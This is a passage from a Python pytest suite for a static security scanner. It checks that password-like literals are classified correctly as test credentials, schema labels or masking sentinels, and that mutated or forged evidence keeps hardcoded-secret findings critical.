            "        User.objects.create_user = foreign_factory\n        User.objects.create_user(",
        ),
        (
            "        credentials = ",
            '        password = "another"\n        credentials = ',
        ),
        (
            "        User.objects.create_user(username=username, password=password)\n",
            "",
        ),
        ("    def test_login(self):", "    def operational_login(self):"),
        (
            "        encoded = ",
            "        base64.b64encode = foreign_encoder\n        encoded = ",
        ),
    ],
)
def test_application133_mismatch_and_replacement_keep_unknown(tmp_path, old, new):
    assert old in _APP133_DRF
    evidence = _app133_drf_projection(tmp_path, _APP133_DRF.replace(old, new, 1))
    assert evidence["eligible"] is False


def test_application133_stale_source_rejects_projection(tmp_path):
    assert (
        _app133_drf_projection(tmp_path, _APP133_DRF, corrupt_source=True)["eligible"]
        is False
    )


@pytest.mark.parametrize(
    "provider",
    [
        "pytest",
        "flask",
        "django",
        "rest_framework",
        "hashlib",
        "base64",
        "json",
        "itsdangerous",
        "passlib",
        "unittest",
    ],
)
def test_application_provider_workspace_replacement_rejects_profile(tmp_path, provider):
    from factoryline.mock_fixture_provenance import application_test_index

    source = tmp_path / "check.py"
    replacement = tmp_path / (provider + ".py")
    sources = {
        source: _APP133_DRF.encode(),
        replacement: b'def dumps(*args, **kwargs): return "discarded"\n',
    }
    modules = {path: ast.parse(raw) for path, raw in sources.items()}
    inventory = {path: hashlib.sha256(raw).hexdigest() for path, raw in sources.items()}
    for path, tree in modules.items():
        tree._oracle_source_sha256 = inventory[path]
    assert application_test_index(tmp_path, modules, sources, inventory) is None


@pytest.mark.parametrize(
    "mutation",
    [
        "missing-header",
        "unknown-profile",
        "executed-target",
        "claimed-transport",
        "claimed-isolation",
        "claimed-runtime",
        "declaration-mismatch",
    ],
)
def test_application_binding_rejects_rehashed_incomplete_assurance(tmp_path, mutation):
    import copy
    import json
    from factoryline.primitive_observation_binding import application_fixture_binding

    path = tmp_path / "checks" / "login.py"
    path.parent.mkdir(parents=True)
    path.write_text(_APP133_DRF, encoding="utf-8")
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        item
        for item in report["primitive_observations"]
        if item["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
    )
    binding = {"checks/login.py": hashlib.sha256(path.read_bytes()).hexdigest()}
    sources = [{"path": key, "sha256": digest} for key, digest in binding.items()]
    assert application_fixture_binding(finding, sources, binding)
    altered = copy.deepcopy(finding)
    facts = altered["facts"]
    evidence = facts["fixture_evidence"]
    if mutation == "missing-header":
        del evidence["witness_sources"]["header"]
        del evidence["witness_spans"]["header"]
    elif mutation == "unknown-profile":
        evidence["profile"] = "UNREVIEWED_PROFILE"
    elif mutation == "declaration-mismatch":
        evidence["declaration_span"][0] += 1
    else:
        field, value = {
            "executed-target": ("target_execution", "performed"),
            "claimed-transport": ("transport_role", "PROVEN_NO_EXTERNAL_TRANSPORT"),
            "claimed-isolation": ("isolation_assurance", "PROVEN_ISOLATED"),
            "claimed-runtime": ("runtime_assurance", "COMPLETE"),
        }[mutation]
        facts[field] = evidence[field] = value
    unsigned = {
        key: value for key, value in facts.items() if key != "proof_facts_sha256"
    }
    facts["proof_facts_sha256"] = hashlib.sha256(
        json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()
    assert application_fixture_binding(altered, sources, binding) is False


@pytest.mark.parametrize(
    "name",
    [
        "annotate_application_fixture",
        "application_fixture_binding",
        "_application_witness_bindings",
        "_application_assurance_binding",
    ],
)
def test_application_binding_helpers_track_runtime_replacements(monkeypatch, name):
    from factoryline import primitive_observation_binding as binding

    original = getattr(binding, name)
    assert original in binding.primitive_binding_helpers()

    def replacement(*args, **kwargs):
        return False

    monkeypatch.setattr(binding, name, replacement)
    assert replacement in binding.primitive_binding_helpers()
    assert original not in binding.primitive_binding_helpers()


def test_application_direct_returns_use_captured_source_index(tmp_path):
    from factoryline.credential_role_constructor_provider import SourceSnapshotIndex
    from factoryline.mock_fixture_provenance import _app_direct_returns

    path = tmp_path / "factory.py"
    raw = b"def create():\n    def nested(): return 99\n    return 7\n"
    tree = ast.parse(raw)
    digest = hashlib.sha256(raw).hexdigest()
    tree._oracle_source_sha256 = digest
    source = SourceSnapshotIndex(tmp_path, {path: tree}, {path: raw}, {path: digest})
    returns = _app_direct_returns({"source": source}, path, tree.body[0])
    assert len(returns) == 1 and returns[0].value.value == 7


_METADATA143_SCHEMA = """class Root:
    password_caption = "Credential label"
    @classmethod
    def schema(cls):
        return {"type": "object", "properties": {"password": {"type": "string", "title": cls.password_caption}}}

class Child(Root):
    password_caption = "Child label"
"""

_METADATA143_MASK = """SECRET_SENTINEL = "visible-mask"
class Holder:
    def masked(self):
        config = self._config.copy()
        for key in config:
            if key in self.schema["secret"]:
                config[key] = SECRET_SENTINEL
        return config
    def update(self, incoming):
        config = {}
        for k, v in incoming.items():
            if k in self.schema.get("secret", []) and v == SECRET_SENTINEL:
                config[k] = self[k]
            else:
                config[k] = v
        self._config = config
"""


def _metadata143_projection(
    tmp_path, text, member, owner=None, extras=None, stale=False
):
    from factoryline import review_audits as audit
    from factoryline.credential_role_constructor_provider import (
        SourceSnapshotIndex,
        PresentationRoleIndex,
    )

    path = tmp_path / "sample.py"
    files = {path: text.encode()}
    files.update(
        {tmp_path / name: value.encode() for name, value in (extras or {}).items()}
    )
    snapshots, inventory = {}, {}
    for target, raw in files.items():
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(raw)
        tree = ast.parse(raw)
        tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
        snapshots[target], inventory[target] = tree, tree._oracle_source_sha256
    tree = snapshots[path]
    scope = (
        next(
            node
            for node in tree.body
            if isinstance(node, ast.ClassDef) and node.name == owner
        )
        if owner
        else tree
    )
    declaration = next(
        node
        for node in scope.body
        if isinstance(node, ast.Assign)
        and isinstance(node.targets[0], ast.Name)
        and node.targets[0].id == member
    )
    if stale:
        files[path] += b"\n# changed"
    source = SourceSnapshotIndex(tmp_path, snapshots, files, inventory)
    imports = {
        target: audit._oracle_imports(tmp_path, target, node, {p: p for p in files})
        for target, node in snapshots.items()
    }
    return PresentationRoleIndex(source, imports, audit).evidence(path, declaration)


@pytest.mark.parametrize("owner", ["Root", "Child"])
def test_metadata143_schema_label_and_inherited_label(tmp_path, owner):
    evidence = _metadata143_projection(
        tmp_path, _METADATA143_SCHEMA, "password_caption", owner
    )
    assert evidence["eligible"] is True
    assert evidence["profile"] == "JSON_SCHEMA_ANNOTATION"
    assert evidence["runtime_assurance"] == "INCOMPLETE"
    assert evidence["transport_role"] == "UNASSESSED"
    assert {row["role"] for row in evidence["uses"]} == {"SCHEMA_TITLE"}


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ('"title": cls.password_caption', '"default": cls.password_caption'),
        ('"type": "object"', '"type": "unknown"'),
        ("@classmethod", "@staticmethod"),
        ("def schema(cls):", "def schema(cls):\n        cls = replacement"),
        ("class Child(Root):", "class Child(UnknownRoot):"),
        (
            '    password_caption = "Child label"',
            '    password_caption = "Child label"\n    password_caption = "second"',
        ),
        (
            "class Child(Root):",
            "class Child(Root):\n    def authenticate(self): return self.password_caption",
        ),
        ("class Child(Root):", "class Child(Root, UnknownMixin):"),
    ],
)
def test_metadata143_ambiguous_schema_keeps_credential_unknown(tmp_path, old, new):
    evidence = _metadata143_projection(
        tmp_path, _METADATA143_SCHEMA.replace(old, new), "password_caption", "Child"
    )
    assert evidence["eligible"] is False


def test_metadata143_mask_requires_output_and_previous_value_roles(tmp_path):
    evidence = _metadata143_projection(tmp_path, _METADATA143_MASK, "SECRET_SENTINEL")
    assert evidence["eligible"] is True
    assert evidence["profile"] == "MASKING_SENTINEL"
    assert {row["role"] for row in evidence["uses"]} == {
        "MASK_OUTPUT",
        "PRESERVE_PREVIOUS_VALUE",
    }


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("self._config.copy()", "self._config"),
        ("config[k] = self[k]", 'config[k] = "replacement-password"'),
        ("v == SECRET_SENTINEL", "v != SECRET_SENTINEL"),
        ('key in self.schema["secret"]', 'key in self.schema["public"]'),
        ('k in self.schema.get("secret", [])', 'k in self.schema.get("public", [])'),
        (
            "        self._config = config",
            "        self._config = config\n        authenticate(SECRET_SENTINEL)",
        ),
        ("        return config", "        return SECRET_SENTINEL"),
    ],
)
def test_metadata143_mask_conflicts_keep_credential_unknown(tmp_path, old, new):
    evidence = _metadata143_projection(
        tmp_path, _METADATA143_MASK.replace(old, new), "SECRET_SENTINEL"
    )
    assert evidence["eligible"] is False


@pytest.mark.parametrize(
    "text,member,owner",
    [
        (_METADATA143_SCHEMA, "password_caption", "Child"),
        (_METADATA143_MASK, "SECRET_SENTINEL", None),
    ],
)
def test_metadata143_stale_source_rejects_projection(tmp_path, text, member, owner):
    assert (
        _metadata143_projection(tmp_path, text, member, owner, stale=True)["eligible"]
        is False
    )


@pytest.mark.parametrize(
    "extra",
    [
        '        authenticate(password=schema["properties"]["password"]["title"])',
        '        schema["properties"]["password"]["default"] = schema["properties"]["password"].pop("title")',
        "        schema = foreign_schema",
        "        forwarded = schema\n        publish(forwarded)",
        "        return {}",
    ],
)
def test_metadata143_schema_escape_or_rebind_is_not_a_label_proof(tmp_path, extra):
    source = _METADATA143_SCHEMA.replace(
        '        return {"type":', '        schema = {"type":', 1
    )
    source = source.replace(
        "\n\nclass Child", "\n" + extra + "\n        return schema\n\nclass Child", 1
    )
    assert (
        _metadata143_projection(tmp_path, source, "password_caption", "Child")[
            "eligible"
        ]
        is False
    )


@pytest.mark.parametrize(
    "foreign",
    [
        "import sample\nauthenticate(sample.SECRET_SENTINEL)\n",
        "from sample import SECRET_SENTINEL as forwarded\nauthenticate(forwarded)\n",
    ],
)
def test_metadata143_cross_module_credential_use_blocks_mask_projection(
    tmp_path, foreign
):
    evidence = _metadata143_projection(
        tmp_path, _METADATA143_MASK, "SECRET_SENTINEL", extras={"consumer.py": foreign}
    )
    assert evidence["eligible"] is False


def test_metadata143_restored_map_publication_cannot_be_overwritten(tmp_path):
    source = _METADATA143_MASK.replace(
        "        self._config = config",
        "        self._config = config\n        self._config = incoming",
    )
    assert (
        _metadata143_projection(tmp_path, source, "SECRET_SENTINEL")["eligible"]
        is False
    )


@pytest.mark.parametrize(
    "mutation",
    [
        'self._config["password"] = incoming["password"]',
        "self._config.update(incoming)",
        "alias = self._config\n        alias.update(incoming)",
        "mutate(self._config)",
    ],
)
def test_metadata143_published_storage_cannot_escape_or_mutate(tmp_path, mutation):
    source = _METADATA143_MASK + "\n        " + mutation + "\n"
    assert (
        _metadata143_projection(tmp_path, source, "SECRET_SENTINEL")["eligible"]
        is False
    )


@pytest.mark.parametrize(
    "source,expected", [(_METADATA143_SCHEMA, 2), (_METADATA143_MASK, 1)]
)
def test_metadata143_native_metadata_partition_retains_critical_primitive(
    tmp_path, source, expected
):
    _write(tmp_path, "sample.py", source)
    first = security_scan(tmp_path)
    second = security_scan(tmp_path)
    for report in (first, second):
        primitives = [
            row
            for row in report.get("primitive_observations", [])
            if row.get("facts", {}).get("disposition") == "SOURCE_PRESENTATION_METADATA"
        ]
        assert len(primitives) == expected
        assert not [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
        ]
        for finding in primitives:
            assert finding["severity"] == "CRITICAL"
            assert finding["facts"]["runtime_assurance"] == "INCOMPLETE"
            assert finding["facts"]["downstream_consumer_security"] == "UNASSESSED"


@pytest.mark.parametrize(
    "mutation",
    [
        "schema",
        "disposition",
        "witness",
        "roles",
        "duplicate",
        "declaration",
        "consumer",
        "source",
    ],
)
def test_metadata143_rehashed_invalid_witness_restores_critical_alert(
    tmp_path, mutation
):
    import copy
    import json
    from factoryline import primitive_observation_binding as binding
    from factoryline import review_audits as audit

    _write(tmp_path, "sample.py", _METADATA143_MASK)
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        row
        for row in report["primitive_observations"]
        if row["facts"].get("disposition") == "SOURCE_PRESENTATION_METADATA"
    )
    altered = copy.deepcopy(finding)
    facts = altered["facts"]
    evidence = facts["fixture_evidence"]
    if mutation in {"schema", "disposition"}:
        facts[mutation] = (
            "factory.application-test-credential.v1"
            if mutation == "schema"
            else "TEST_OWNED_APPLICATION_CREDENTIAL"
        )
    elif mutation == "witness":
        evidence["uses"][0]["sha256"] = "0" * 64
    elif mutation == "roles":
        evidence["uses"] = [
            row for row in evidence["uses"] if row["role"] != "PRESERVE_PREVIOUS_VALUE"
        ]
    elif mutation == "duplicate":
        evidence["uses"].append(copy.deepcopy(evidence["uses"][0]))
    elif mutation == "declaration":
        evidence["declaration"]["source_role"] = "local_literal"
    elif mutation == "consumer":
        evidence["downstream_consumer_security"] = facts[
            "downstream_consumer_security"
        ] = "PROVEN_SAFE"
    else:
        evidence["source_sha256"] = "0" * 64
    unsigned = {
        key: value for key, value in facts.items() if key != "proof_facts_sha256"
    }
    facts["proof_facts_sha256"] = hashlib.sha256(
        json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()
    core = {
        "sources": [
            {
                "path": "sample.py",
                "sha256": hashlib.sha256(
                    (tmp_path / "sample.py").read_bytes()
                ).hexdigest(),
            }
        ],
        "findings": [],
        "primitive_observations": [altered],
        "audit_coverage": {"complete": True},
    }
    binding.partition_proven_primitive_observations(core, audit.integrity)
    assert not core["primitive_observations"]
    assert len(core["findings"]) == 1 and core["findings"][0]["severity"] == "CRITICAL"


@pytest.mark.parametrize("member", ["evidence", "_schema_uses", "_mask_uses"])
def test_metadata143_runtime_projection_method_replacement_invalidates_cache(
    tmp_path, monkeypatch, member
):
    from factoryline import credential_role_constructor_provider as roles

    _write(
        tmp_path,
        "sample.py",
        _METADATA143_SCHEMA if member == "_schema_uses" else _METADATA143_MASK,
    )
    assert security_scan(tmp_path).get("primitive_observations")
    monkeypatch.setattr(
        roles.PresentationRoleIndex,
        member,
        lambda *args, **kw: {"eligible": False} if member == "evidence" else None,
    )
    report = security_scan(tmp_path)
    assert [
        row
        for row in report["findings"]
        if row["code"] == "SECURITY_HARDCODED_SECRET" and row["severity"] == "CRITICAL"
    ]


@pytest.mark.parametrize(
    "owner,member",
    [("SourceSnapshotIndex", "validate"), ("DeclarationFact", "public_facts")],
)
def test_metadata143_shared_source_method_code_change_invalidates_cache(
    tmp_path, monkeypatch, owner, member
):
    from factoryline import credential_role_constructor_provider as roles

    _write(tmp_path, "sample.py", _METADATA143_MASK)
    assert security_scan(tmp_path).get("primitive_observations")
    method = getattr(getattr(roles, owner), member)
    replacement = (
        (lambda self, path: False) if member == "validate" else (lambda self: {})
    )
    monkeypatch.setattr(method, "__code__", replacement.__code__)
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        assert [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
            and row["severity"] == "CRITICAL"
        ]
